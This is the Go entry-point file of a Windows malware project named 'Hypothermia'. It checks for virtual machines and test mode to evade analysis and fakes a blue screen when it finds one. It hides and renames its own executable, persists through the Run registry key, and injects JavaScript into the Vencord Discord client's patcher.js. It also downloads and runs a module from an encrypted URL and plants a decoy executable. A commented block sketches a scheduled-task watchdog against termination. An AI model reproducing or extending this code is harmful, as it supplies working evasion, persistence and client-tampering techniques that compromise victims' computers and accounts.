package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"Hypothermia/config"
	"Hypothermia/src/core"
	"Hypothermia/src/funcs"
	"Hypothermia/src/utils"
	"Hypothermia/src/utils/crypto"
	"Hypothermia/src/utils/persistence"
)

const (
	START_FAKE_PROC int = 1
	RUN_FAKE_MODULE int = 2
	DELETE_OLD_PROC int = 3
)

func main() {
	if config.AntiVM {
		code := 0

		if utils.CheckVMs() {
			code = 1
		}

		if utils.CheckDrivers() {
			code = 2
		}

		if utils.CheckProcesses() {
			code = 3
		}

		if utils.CheckVT() {
			code = 4

			os.Exit(0)
			return
		}

		if code != 0 {
			funcs.BlueScreen()

			fmt.Println("AVC -", code)
			fmt.Scanln()

			os.Exit(0)
			return
		}
	}

	if config.AntiTestMode && utils.CheckTestMode() {
		fmt.Println("ATC")
		fmt.Scanln()

		os.Exit(1)
		return
	}

	if len(os.Args) == 3 && os.Args[1] == config.Verifier {
		if os.Args[2] != "NIL" && config.StartupMode != DELETE_OLD_PROC {
			if file, err := os.Create(os.Args[2]); err == nil {
				file.Close()
			}

			if config.StartupMode == START_FAKE_PROC {
				time.Sleep(30 * time.Millisecond)

				cmd := exec.Command("cmd.exe", "/c", os.Args[2])
				cmd.Run()
			}
		}

		if config.StartupMode == RUN_FAKE_MODULE {
			dest := filepath.Join(os.Getenv("USERPROFILE"), "Documents", config.ModuleName)

			path, _ := utils.DonwloadFile(utils_crypto.Decrypt(config.ModuleUrl), "")
			utils.UnzipFolder(path, dest)

			arg := filepath.Join(dest, config.ModuleName+".exe")
			cmd := exec.Command("cmd.exe", "/c", arg)
			cmd.Run()
		}

		core.OnStartup()
		core.Init()
		return
	}

	folder := utils.GetMainFolder()
	_, err := os.Stat(folder)
	if err != nil {
		if os.IsNotExist(err) {
			err = os.MkdirAll(folder, os.ModePerm)
			if err != nil {
				fmt.Println("main/1 -", err)
				fmt.Scanln()
				return
			}

			if !config.Debugging && config.HideFolder {
				err = utils.HideItem(folder)
				if err != nil {
					fmt.Println("main/2 -", err)
					fmt.Scanln()
					return
				}
			}
		}
	}

	oldPath, err := os.Executable()
	if err != nil {
		fmt.Println("main/3 -", err)
		fmt.Scanln()
		return
	}

	newPath := filepath.Join(folder, config.RealProcName+".exe")
	err = os.Rename(oldPath, newPath)
	if err != nil {
		fmt.Println("main/4 -", err)
		fmt.Scanln()
		return
	}

	if !config.Debugging && config.AutoStart {
		err := utils.SetRegistryVal(
			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
			config.StartupKeyName,
			fmt.Sprintf("\"%s\" %s %s", newPath, config.Verifier, "NIL"),
		)

		if err != nil {
			fmt.Println("main/5 -", err)
			fmt.Scanln()
			return
		}

		utils_persist.InjectJS(filepath.Join(os.Getenv("APPDATA"), "Vencord\\dist\\patcher.js"))
	}

	// TODO:
	//if config.AntiKill {
	//	script := fmt.Sprintf(
	//		"@echo off\n"+
	//			"tasklist /FI \"IMAGENAME eq %s\" | find /I \"%s\" >nul\n"+
	//			"if not errorlevel 1 (\n"+
	//			"    exit /b 0\n"+
	//			")\n"+
	//			"\n"+
	//			"start \"\" \"%s\"\n",
	//		config.RealProcName, config.RealProcName, newPath,
	//	)
	//
	//	scriptPath := filepath.Join(folder, config.RealProcName+" Updator.bat")
	//	err := os.WriteFile(scriptPath, []byte(script), 0644)
	//	if err != nil {
	//		fmt.Println("main/6 -", err)
	//		fmt.Scanln()
	//		return
	//	}
	//
	//	exec.Command(
	//		"schtasks", "/delete",
	//		"/tn", config.RealProcName,
	//		"/f",
	//	).Run()
	//
	//	exec.Command(
	//		"schtasks", "/create",
	//		"/tn", config.RealProcName,
	//		"/tr", fmt.Sprint(scriptPath),
	//		"/sc", "minute",
	//		"/mo", "1",
	//		"/rl", "LIMITED",
	//		"/f",
	//	).Run()
	//}

	fakePath := filepath.Join(os.Getenv("USERPROFILE"), "Documents", config.FakeProcName+".exe")
	if file, err := os.Create(fakePath); err == nil {
		file.Close()
	}

	utils.SetRegistryVal(
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		config.FakeProcName,
		fakePath,
	)

	cmd := exec.Command(newPath, config.Verifier, oldPath)
	err = cmd.Start()
	if err != nil {
		fmt.Println("main/7 -", err)
		fmt.Scanln()
		return
	}
}
